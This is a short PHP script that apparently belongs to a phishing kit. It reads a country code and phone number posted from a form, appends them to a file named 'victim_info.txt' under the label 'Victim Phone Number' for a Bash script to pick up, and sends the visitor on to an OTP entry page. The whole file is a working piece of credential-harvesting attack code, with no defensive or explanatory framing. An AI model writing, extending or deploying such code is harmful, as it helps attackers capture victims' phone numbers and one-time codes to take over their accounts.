<?php
session_start();

if (isset($_POST['phone-number'])) {
    $countryCode = $_POST['country-code'];
    $phoneNumber = $_POST['phone-number'];
    $fullNumber = $countryCode . $phoneNumber;

    // Store in a file for the Bash script to read
    file_put_contents('victim_info.txt', "Victim Phone Number: $fullNumber\n", FILE_APPEND);

    // Redirect to OTP page
    header('Location: otp.html');
    exit();
} else {
    echo "No phone number was provided.";
}
?>
